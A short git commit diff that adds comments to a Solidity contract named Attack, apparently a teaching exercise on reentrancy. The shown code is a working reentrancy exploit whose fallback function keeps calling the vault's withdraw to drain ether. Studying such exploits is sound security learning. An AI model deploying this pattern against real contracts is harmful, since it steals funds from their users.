1a3d2f8cb47fe620942dff48ac32723dcd454a91
gusgraujo <gusg.raujo@gmail.com>
2022-10-27 15:33:09 +0100

    Comments at ex1

--- Reentrancy Attack/Attack.sol
+++ Reentrancy Attack/Attack.sol
@@ -4,12 +4,14 @@ import "./Vault.sol";
 
 contract Attack {
 
+    //Instanciate the vault contract
     Vault public vault;
 
+    //Set the smart contract Adress that have been deployed with Vault contract
     constructor(address _vaultAddress) public {
         vault = Vault(_vaultAddress);
     }
-
+    //executed whenever the contract receives plain Ether without any data
     fallback () external payable{
         //If vault has more than 1 ether, should collect 1 ether
         if(address(vault).balance >= 1 ether)
@@ -17,10 +19,10 @@ contract Attack {
             vault.withdraw(1 ether);
         }
     }
-
+    //Attack function
     function attack() public payable
     {   
-        require(msg.value >= 1 ether);
+        require(msg.value >= 1 ether); //Validate if the attacker deposited have the ether to attack
         vault.deposit.value(1 ether)(msg.sender);
         vault.withdraw(1 ether);
     }
